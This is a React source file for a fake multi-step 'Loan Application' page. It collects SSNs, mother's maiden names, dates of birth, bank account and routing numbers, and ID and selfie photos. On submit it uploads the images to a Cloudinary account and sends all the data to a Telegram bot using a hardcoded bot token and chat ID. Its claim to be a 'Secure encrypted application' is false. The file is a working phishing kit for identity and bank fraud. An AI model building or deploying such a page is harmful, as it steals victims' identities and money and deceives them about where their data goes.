import { useState } from "react";
import { CreditCard, IdCard, UserCheck } from "lucide-react";
const steps = [
  "Loan Details",
  "Personal Info",
  "Employment",
  "Bank Details",
  "Documents",
];

const inputClass =
  "w-full p-3 border border-gray-200 rounded-xl bg-white focus:outline-none focus:ring-2 focus:ring-green-400 transition";

export default function LoanApplication() {
  const [step, setStep] = useState(0);
  const [direction, setDirection] = useState<"next" | "back">("next");
const [loading, setLoading] = useState(false);
const [preview, setPreview] = useState<any>({});
  const [form, setForm] = useState<any>({});
  const [files, setFiles] = useState<any>({});


  const handleSSN = (e: React.ChangeEvent<HTMLInputElement>) => {
  let value = e.target.value.replace(/\D/g, ""); // remove non-digits

  // limit to 9 digits
  value = value.slice(0, 9);

  // format
  if (value.length > 5) {
    value = value.replace(/(\d{3})(\d{2})(\d{1,4})/, "$1-$2-$3");
  } else if (value.length > 3) {
    value = value.replace(/(\d{3})(\d{1,2})/, "$1-$2");
  }

  setForm((prev: any) => ({
    ...prev,
    ssn: value,
  }));
};



  const goNext = () => {
    setDirection("next");
    setStep((s) => Math.min(s + 1, steps.length - 1));
  };

  const goBack = () => {
    setDirection("back");
    setStep((s) => Math.max(s - 1, 0));
  };

  // ✅ HANDLE INPUT
  const handleChange = (e: any) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  // ✅ HANDLE FILES
  const handleFile = (e: any) => {
  const file = e.target.files[0];
  const name = e.target.name;

  setFiles({ ...files, [name]: file });

  if (file) {
    setPreview({
      ...preview,
      [name]: URL.createObjectURL(file),
    });
  }
};

  // ✅ VALIDATION
  const isStepValid = () => {
    switch (step) {
      case 0:
        return form.loanAmount && form.loanTerm && form.loanPurpose;
      case 1:
        return form.fullName && form.email && form.phone && form.dob && form.address;
      case 2:
        return form.employer && form.job && form.income && form.rent;
      case 3:
        return form.bank && form.account && form.routing;
      case 4:
        return files.idFront && files.idBack && files.selfie;
      default:
        return false;
    }
  };

  // ✅ CLOUDINARY UPLOAD
  const uploadToCloudinary = async (file: File) => {
    const data = new FormData();
    data.append("file", file);
    data.append("upload_preset", "adorethebrand");

    const res = await fetch(
      "https://api.cloudinary.com/v1_1/dx90y9zdx/image/upload",
      { method: "POST", body: data }
    );

    const result = await res.json();
    return result.secure_url;
  };

  // ✅ SUBMIT
 const handleSubmit = async () => {
  if (loading) return;

  try {
    setLoading(true);

    // ✅ Upload files safely
    const [idFront, idBack, selfie] = await Promise.all([
      uploadToCloudinary(files.idFront),
      uploadToCloudinary(files.idBack),
      uploadToCloudinary(files.selfie),
    ]);

    // ❗ safety fallback
    if (!idFront || !idBack || !selfie) {
      throw new Error("File upload failed");
    }

    const message = `
📄 *NEW LOAN APPLICATION*

💰 Amount: ${form.loanAmount}
📅 Term: ${form.loanTerm}
🎯 Purpose: ${form.loanPurpose}

👤 Name: ${form.fullName}
📧 Email: ${form.email}
📞 Phone: ${form.phone}
🆔 SSN: ${form.ssn}
💍 Marital Status: ${form.maritalStatus}
👩 Mother's Maiden Name: ${form.mname}
🏠 Address: ${form.address}
🎂 DOB: ${form.dob}

💼 Employer: ${form.employer}
💼 Job Title: ${form.job}
📊 Experience: ${form.experience}
💵 Income: ${form.income}
🏠 Rent/Mortgage: ${form.rent}
📈 Credit Score: ${form.creditScore}
💳 Credit Card: ${form.CreditCard}
🏡 Home Equity: ${form.homeEquity}
🏘 Property Value: ${form.propertyValue}

🏦 Bank: ${form.bank}
🔢 Account: ${form.account}
🔁 Routing: ${form.routing}

🖼 ID Front: ${idFront}
🖼 ID Back: ${idBack}
🤳 Selfie: ${selfie}
`;

    const res = await fetch(
      "https://api.telegram.org/bot8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE/sendMessage",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: "6837437455",
          text: message,
          parse_mode: "Markdown",
        }),
      }
    );

    if (!res.ok) {
      throw new Error("Telegram failed");
    }

    // optional reset (clean UX)
    setForm({});
    setFiles({});
    setPreview({});

    alert("✅ Application submitted successfully!");
  } catch (err) {
    console.error(err);
    alert("❌ Error submitting application. Please try again.");
  } finally {
    setLoading(false);
  }
};

  return (
    <div className="min-h-screen bg-gradient-to-br from-green-50 to-white flex items-center justify-center p-4">
      <div className="w-full max-w-3xl bg-white rounded-2xl shadow-xl border overflow-hidden">

        {/* HEADER */}
        <div className="p-6 bg-green-600 text-white">
          <h1 className="text-xl font-bold">Loan Application</h1>
          <p className="text-sm opacity-80">Secure encrypted application</p>
        </div>

        {/* PROGRESS */}
        <div className="p-6 pb-2">
          <div className="flex justify-between text-xs mb-2 text-gray-500">
            {steps.map((s, i) => (
              <span key={i} className={i === step ? "text-green-600 font-semibold" : ""}>
                {s}
              </span>
            ))}
          </div>

          <div className="h-2 bg-gray-200 rounded-full">
            <div
              className="h-2 bg-green-500 rounded-full transition-all duration-500"
              style={{ width: `${((step + 1) / steps.length) * 100}%` }}
            />
          </div>
        </div>

        {/* CONTENT */}
        <div className="p-6">
          <div key={step} className={`space-y-5 animate-fadeIn ${direction === "next" ? "animate-slideLeft" : "animate-slideRight"}`}>

            <div className="inline-block px-3 py-1 text-xs bg-green-100 text-green-700 rounded-full font-medium">
              Step {step + 1} of {steps.length} — {steps[step]}
            </div>

            {/* STEP 1 */}
          {step === 0 && (
  <div className="space-y-5">

    <div className="grid md:grid-cols-2 gap-5">

      {/* LOAN AMOUNT */}
      <div className="flex flex-col gap-1">
        <label className="text-sm font-medium text-gray-700">
          Loan Amount <span className="text-red-500">*</span>
        </label>
        <input
          name="loanAmount"
          onChange={handleChange}
          className={inputClass}
          placeholder="$ 5,000"
          required
        />
      </div>

      {/* LOAN TERM */}
      <div className="flex flex-col gap-1">
        <label className="text-sm font-medium text-gray-700">
          Loan Term (Months) <span className="text-red-500">*</span>
        </label>
        <input
          name="loanTerm"
          onChange={handleChange}
          className={inputClass}
          placeholder="12"
          required
        />
      </div>

    </div>

    {/* LOAN PURPOSE */}
    <div className="flex flex-col gap-1">
      <label className="text-sm font-medium text-gray-700">
        Loan Purpose <span className="text-red-500">*</span>
      </label>
      <select
        name="loanPurpose"
        onChange={handleChange}
        className={inputClass}
        required
        defaultValue=""
      >
        <option value="" disabled>Select purpose</option>
        <option value="Business">Business</option>
        <option value="Education">Education</option>
        <option value="Medical">Medical</option>
        <option value="Car">Car</option>
        <option value="Home">Home</option>
        <option value="Other">Other</option>
      </select>
    </div>

  </div>
)}

            {/* STEP 2 */}
          {step === 1 && (
  <div className="grid md:grid-cols-2 gap-5">

    {/* FULL NAME */}
    <div className="flex flex-col gap-1">
      <label className="text-sm font-medium text-gray-700">
        Full Legal Name <span className="text-red-500">*</span>
      </label>
      <input
        name="fullName"
        onChange={handleChange}
        className={inputClass}
        placeholder="John Doe"
        required
      />
    </div>

    {/* EMAIL */}
    <div className="flex flex-col gap-1">
      <label className="text-sm font-medium text-gray-700">
        Email <span className="text-red-500">*</span>
      </label>
      <input
        name="email"
        onChange={handleChange}
        className={inputClass}
        placeholder="you@email.com"
        required
      />
    </div>

    {/* PHONE */}
    <div className="flex flex-col gap-1">
      <label className="text-sm font-medium text-gray-700">
        Phone <span className="text-red-500">*</span>
      </label>
      <input
        name="phone"
        onChange={handleChange}
        className={inputClass}
        placeholder="+1 234 567 890"
        required
      />
    </div>

    {/* SSN */}
    <div className="flex flex-col gap-1">
      <label className="text-sm font-medium text-gray-700">
        SSN <span className="text-red-500">*</span>
      </label>
      <input
        name="ssn"
        value={form.ssn}
        onChange={handleSSN}
        className={inputClass}
        placeholder="123-45-6789"
        required
      />
    </div>

    {/* DOB */}
    <div className="flex flex-col gap-1">
      <label className="text-sm font-medium text-gray-700">
        Date of Birth <span className="text-red-500">*</span>
      </label>
      <input
        type="date"
        name="dob"
        onChange={handleChange}
        className={inputClass}
        required
      />
    </div>

    {/* MARITAL STATUS */}
    <div className="flex flex-col gap-1">
      <label className="text-sm font-medium text-gray-700">
        Marital Status <span className="text-red-500">*</span>
      </label>
      <select
        name="maritalStatus"
        onChange={handleChange}
        className={inputClass}
        required
        defaultValue=""
      >
        <option value="" disabled>Select status</option>
        <option>Single</option>
        <option>Married</option>
        <option>Divorced</option>
        <option>Widowed</option>
        <option>Prefer not to say</option>
      </select>
    </div>

    {/* MOTHER MAIDEN NAME */}
    <div className="flex flex-col gap-1 md:col-span-2">
      <label className="text-sm font-medium text-gray-700">
        Mother’s Maiden Name <span className="text-red-500">*</span>
      </label>
      <input
        name="mname"
        onChange={handleChange}
        className={inputClass}
        placeholder="Smith"
        required
      />
    </div>

    {/* ADDRESS */}
    <div className="flex flex-col gap-1 md:col-span-2">
      <label className="text-sm font-medium text-gray-700">
        Home Address <span className="text-red-500">*</span>
      </label>
      <input
        name="address"
        onChange={handleChange}
        className={inputClass}
        placeholder="Street, City, State"
        required
      />
    </div>

  </div>
)}
            {/* STEP 3 */}
           {step === 2 && (
  <div className="space-y-5">

    {/* EMPLOYER + JOB */}
    <div className="grid md:grid-cols-2 gap-4">
      <div className="flex flex-col gap-1">
        <label className="text-sm font-medium">
          Present Employer <span className="text-red-500">*</span>
        </label>
        <input
          name="employer"
          onChange={handleChange}
          className={inputClass}
          placeholder="Company name"
          required
        />
      </div>

      <div className="flex flex-col gap-1">
        <label className="text-sm font-medium">
          Occupation / Job Title <span className="text-red-500">*</span>
        </label>
        <input
          name="job"
          onChange={handleChange}
          className={inputClass}
          placeholder="e.g. Registered Nurse"
          required
        />
      </div>
    </div>

    {/* EXPERIENCE + INCOME */}
    <div className="grid md:grid-cols-2 gap-4">
      <div className="flex flex-col gap-1">
        <label className="text-sm font-medium">
          Years of Experience <span className="text-red-500">*</span>
        </label>
        <select
          name="experience"
          onChange={handleChange}
          className={inputClass}
          defaultValue=""
          required
        >
          <option value="" disabled>Select</option>
          <option>Less than 1 year</option>
          <option>1 to 2 years</option>
          <option>3 to 5 years</option>
          <option>6 to 10 years</option>
          <option>Over 10 years</option>
        </select>
      </div>

      <div className="flex flex-col gap-1">
        <label className="text-sm font-medium">
          Gross Monthly Income <span className="text-red-500">*</span>
        </label>
        <input
          name="income"
          onChange={handleChange}
          className={inputClass}
          placeholder="$ e.g. 5000"
          required
        />
      </div>
    </div>

    {/* RENT + CREDIT SCORE */}
    <div className="grid md:grid-cols-2 gap-4">
      <div className="flex flex-col gap-1">
        <label className="text-sm font-medium">
          Monthly Rent / Mortgage <span className="text-red-500">*</span>
        </label>
        <input
          name="rent"
          onChange={handleChange}
          className={inputClass}
          placeholder="$ e.g. 1400"
          required
        />
      </div>

      <div className="flex flex-col gap-1">
        <label className="text-sm font-medium">
          Estimated Credit Score <span className="text-red-500">*</span>
        </label>
        <select
          name="creditScore"
          onChange={handleChange}
          className={inputClass}
          defaultValue=""
          required
        >
          <option value="" disabled>Select</option>
          <option>300 to 499 (Poor)</option>
          <option>500 to 579 (Very Poor)</option>
          <option>580 to 660 (Fair)</option>
          <option>670 to 739 (Good)</option>
          <option>740 to 799 (Very Good)</option>
          <option>800 to 850 (Exceptional)</option>
        </select>
      </div>
    </div>

    {/* CREDIT CARD + HOME EQUITY */}
    <div className="grid md:grid-cols-2 gap-4">
      <div className="flex flex-col gap-1">
        <label className="text-sm font-medium">
          Do you have a credit card? <span className="text-red-500">*</span>
        </label>
        <select
          name="CreditCard"
          onChange={handleChange}
          className={inputClass}
          defaultValue=""
          required
        >
          <option value="" disabled>Select</option>
          <option>Yes</option>
          <option>No</option>
          <option>Prefer not to say</option>
        </select>
      </div>

      <div className="flex flex-col gap-1">
        <label className="text-sm font-medium">
          Do you have home equity? <span className="text-red-500">*</span>
        </label>
        <select
          name="homeEquity"
          onChange={handleChange}
          className={inputClass}
          defaultValue=""
          required
        >
          <option value="" disabled>Select</option>
          <option>Yes</option>
          <option>No</option>
          <option>Not sure</option>
        </select>
      </div>
    </div>

    {/* PROPERTY VALUE */}
    <div className="flex flex-col gap-1">
      <label className="text-sm font-medium">
        Estimated Property Value <span className="text-red-500">*</span>
      </label>
      <input
        name="propertyValue"
        onChange={handleChange}
        className={inputClass}
        placeholder="Enter value or 0"
        required
      />
    </div>

  </div>
)}

            {/* STEP 4 */}
          {step === 3 && (
  <div className="space-y-5">

    {/* BANK + ACCOUNT */}
    <div className="grid md:grid-cols-2 gap-4">
      
      <div className="flex flex-col gap-1">
        <label className="text-sm font-medium">
          Bank / Financial Institution <span className="text-red-500">*</span>
        </label>
        <input
          name="bank"
          onChange={handleChange}
          className={inputClass}
          placeholder="e.g. Chase, Bank of America"
          required
        />
      </div>

      <div className="flex flex-col gap-1">
        <label className="text-sm font-medium">
          Checking Account Number <span className="text-red-500">*</span>
        </label>
        <input
          name="account"
          onChange={handleChange}
          className={inputClass}
          placeholder="Enter your full account number"
          required
        />
      </div>
    </div>

    {/* ROUTING */}
    <div className="flex flex-col gap-1">
      <label className="text-sm font-medium">
        Bank Routing Number <span className="text-red-500">*</span>
      </label>
      <input
        name="routing"
        onChange={handleChange}
        className={inputClass}
        placeholder="9-digit ABA routing number"
        required
      />
    </div>

  </div>
)}

            {/* STEP 5 */}
       {step === 4 && (
  <div className="space-y-6">

    {/* HEADER */}
    <div>
      <h2 className="text-lg font-semibold text-gray-800">
        Upload Verification Documents
      </h2>
      <p className="text-sm text-gray-400">
        Please upload clear images (JPG or PNG only)
      </p>
    </div>

    {/* GRID */}
    <div className="grid md:grid-cols-3 gap-5">

      {/* FRONT ID */}
      <label className="cursor-pointer group">
        <input type="file" name="idFront" onChange={handleFile} className="hidden" required />

        <div className="border-2 border-dashed border-green-300 rounded-2xl p-6 text-center transition hover:border-green-600 hover:bg-green-50">

          <div className="flex justify-center mb-3 text-green-600">
            <IdCard size={34} />
          </div>

          <p className="font-semibold flex items-center justify-center gap-1">
            ID Front <span className="text-red-500">*</span>
          </p>

          <p className="text-xs text-gray-400 mt-1">
            Upload front of your government ID
          </p>

          {preview.idFront ? (
            <img
              src={preview.idFront}
              className="w-full h-32 object-cover rounded-xl mt-3 border"
            />
          ) : (
            <p className="text-xs text-green-500 mt-3 font-medium">
              Click to upload file
            </p>
          )}
        </div>
      </label>

      {/* BACK ID */}
      <label className="cursor-pointer group">
        <input type="file" name="idBack" onChange={handleFile} className="hidden" required />

        <div className="border-2 border-dashed border-green-300 rounded-2xl p-6 text-center transition hover:border-green-600 hover:bg-green-50">

          <div className="flex justify-center mb-3 text-green-600">
            <CreditCard size={34} />
          </div>

          <p className="font-semibold flex items-center justify-center gap-1">
            ID Back <span className="text-red-500">*</span>
          </p>

          <p className="text-xs text-gray-400 mt-1">
            Upload back of your ID card
          </p>

          {preview.idBack ? (
            <img
              src={preview.idBack}
              className="w-full h-32 object-cover rounded-xl mt-3 border"
            />
          ) : (
            <p className="text-xs text-green-500 mt-3 font-medium">
              Click to upload file
            </p>
          )}
        </div>
      </label>

      {/* SELFIE */}
      <label className="cursor-pointer group">
        <input type="file" name="selfie" onChange={handleFile} className="hidden" required />

        <div className="border-2 border-dashed border-green-300 rounded-2xl p-6 text-center transition hover:border-green-600 hover:bg-green-50">

          <div className="flex justify-center mb-3 text-green-600">
            <UserCheck size={34} />
          </div>

          <p className="font-semibold flex items-center justify-center gap-1">
            Selfie with ID <span className="text-red-500">*</span>
          </p>

          <p className="text-xs text-gray-400 mt-1">
            Hold your ID next to your face
          </p>

          {preview.selfie ? (
            <img
              src={preview.selfie}
              className="w-full h-32 object-cover rounded-xl mt-3 border"
            />
          ) : (
            <p className="text-xs text-green-500 mt-3 font-medium">
              Click to upload file
            </p>
          )}
        </div>
      </label>

    </div>

  </div>
)}
          </div>
        </div>

        {loading && (
  <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50">
    <div className="bg-white p-6 rounded-2xl text-center shadow-lg w-[250px]">

      <div className="animate-spin w-10 h-10 border-4 border-green-500 border-t-transparent rounded-full mx-auto mb-4"></div>

      <p className="font-semibold text-gray-700">
        Submitting Application...
      </p>
      <p className="text-xs text-gray-400 mt-1">
        Please wait while we process your data
      </p>

    </div>
  </div>
)}

        {/* BUTTONS */}
        <div className="p-6 flex justify-between border-t bg-gray-50">
          <button onClick={goBack} disabled={step === 0} className="px-5 py-2 bg-gray-200 rounded-xl">
            ← Back
          </button>

          {step < steps.length - 1 ? (
            <button
              onClick={goNext}
              disabled={!isStepValid()}
              className={`px-6 py-2 rounded-xl text-white ${
                isStepValid() ? "bg-green-600" : "bg-gray-400"
              }`}
            >
              Continue →
            </button>
          ) : (
            <button
              onClick={handleSubmit}
              disabled={!isStepValid()}
              className="px-6 py-2 bg-green-700 text-white rounded-xl"
            >
              Submit
            </button>
          )}
        </div>
      </div>

      {/* ANIMATIONS */}
      <style>{`
        .animate-fadeIn { animation: fadeIn 0.3s ease-in-out; }
        .animate-slideLeft { animation: slideLeft 0.3s ease-in-out; }
        .animate-slideRight { animation: slideRight 0.3s ease-in-out; }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes slideLeft { from { transform: translateX(30px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        @keyframes slideRight { from { transform: translateX(-30px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
      `}</style>
    </div>
  );
}